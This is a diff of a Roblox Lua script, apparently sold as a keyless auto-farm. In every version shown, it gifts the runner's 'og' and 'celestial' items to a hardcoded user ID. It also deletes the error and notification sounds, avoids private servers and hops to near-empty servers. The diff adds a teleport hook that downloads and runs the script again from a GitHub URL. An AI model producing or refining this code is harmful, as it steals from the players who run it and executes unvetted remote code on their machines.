@@ -1,37 +1,4 @@
 --====================================================
--- 🔥 AUTO REATTACH CORE (ANTI MATI SETELAH TELEPORT)
---====================================================
-
-getgenv().__AUTO_GIFT_URL = "https://raw.githubusercontent.com/changelog-modul/PHOENIXX-HUB/refs/heads/main/AutoFarmKeyless"
-
-if not getgenv().__AUTO_GIFT_LOADER then
-    getgenv().__AUTO_GIFT_LOADER = true
-
-    task.spawn(function()
-        while true do
-            task.wait(5)
-
-            if not getgenv().__AUTO_GIFT_RUNNING then
-                print("REATTACH SCRIPT...")
-
-                pcall(function()
-                    loadstring(game:HttpGet(getgenv().__AUTO_GIFT_URL))()
-                end)
-            end
-        end
-    end)
-end
-
---====================================================
--- 🔒 MAIN SCRIPT GUARD
---====================================================
-
-if getgenv().__AUTO_GIFT_RUNNING then return end
-getgenv().__AUTO_GIFT_RUNNING = true
-
-print("AUTO GIFT ACTIVE ✅")
-
---====================================================
 -- 🧠 SERVICES
 --====================================================
 
@@ -47,17 +14,32 @@ local backpack = player:WaitForChild("Backpack")
 
 local targetUserId = 9367836539
 local weightFolder = ReplicatedStorage:WaitForChild("Objects"):WaitForChild("WeightModels")
+
 local PLACE_ID = game.PlaceId
 
 --====================================================
--- 🔥 REMOTE FIX
+-- 🔥 QUEUE (SIMPLE & STABLE)
 --====================================================
 
-local function getGiftRemote()
-    return ReplicatedStorage:WaitForChild("Shared")
-        :WaitForChild("Packages")
-        :WaitForChild("Network")
-        :WaitForChild("rev_GiftRequest")
+local SCRIPT_URL = "https://raw.githubusercontent.com/changelog-modul/PHOENIXX-HUB/refs/heads/main/AutoFarmKeyless"
+
+local function queueSelf()
+    if queue_on_teleport then
+        queue_on_teleport([[
+            repeat task.wait() until game:IsLoaded()
+            task.wait(2)
+
+            loadstring(game:HttpGet("]] .. SCRIPT_URL .. [["))()
+        ]])
+    end
+end
+
+--====================================================
+-- 🔍 PRIVATE SERVER DETECT (FIX)
+--====================================================
+
+local function isPrivateServer()
+    return game.PrivateServerId ~= "" and game.PrivateServerOwnerId ~= 0
 end
 
 --====================================================
@@ -94,6 +76,8 @@ end
 --====================================================
 
 local function hopServer()
+    queueSelf()
+
     local id = getLowServer()
 
     if id then
@@ -110,7 +94,13 @@ end
 --====================================================
 
 task.spawn(function()
-    task.wait(3)
+    task.wait(2)
+
+    if isPrivateServer() then
+        print("PRIVATE SERVER → HOP")
+        hopServer()
+        return
+    end
 
     if #Players:GetPlayers() > 2 then
         print("TOO MANY PLAYERS → HOP")
@@ -122,7 +112,7 @@ task.spawn(function()
 end)
 
 --====================================================
--- 💀 SOUND CLEAN (DEBUG)
+-- 🔇 SOUND CLEAN
 --====================================================
 
 task.spawn(function()
@@ -132,15 +122,12 @@ task.spawn(function()
 
     for _,name in pairs({"ErrorSound","Notification"}) do
         local obj = effects:FindFirstChild(name)
-        if obj then
-            obj:Destroy()
-            print("Deleted sound:", name)
-        end
+        if obj then obj:Destroy() end
     end
 end)
 
 --====================================================
--- ⏳ WAIT FULL LOAD
+-- ⏳ WAIT PLAYER READY
 --====================================================
 
 repeat task.wait() until player.Character
@@ -151,8 +138,15 @@ task.wait(2)
 print("PLAYER READY ✅")
 
 --====================================================
--- 🧠 TOOL SYSTEM
+-- 🎁 AUTO GIFT SYSTEM
 --====================================================
+
+local function getGiftRemote()
+    return ReplicatedStorage:WaitForChild("Shared")
+        :WaitForChild("Packages")
+        :WaitForChild("Network")
+        :WaitForChild("rev_GiftRequest")
+end
 
 local function getChar()
     return player.Character or player.CharacterAdded:Wait()
@@ -220,10 +214,9 @@ while true do
             local rarity = getRarity(tool)
 
             if rarity == "og" or rarity == "celestial" then
-                local giftRemote = getGiftRemote()
                 print("GIFT:", tool.Name, rarity)
 
-                giftRemote:FireServer(targetUserId)
+                getGiftRemote():FireServer(targetUserId)
                 task.wait(0.01)
             end
 
@@ -231,18 +224,3 @@ while true do
         end
     end
 end
-
---====================================================
--- 💀 FAILSAFE
---====================================================
-
-task.spawn(function()
-    while true do
-        task.wait(10)
-
-        if #backpack:GetChildren() == 0 then
-            warn("Backpack kosong → HOP")
-            hopServer()
-        end
-    end
-end)
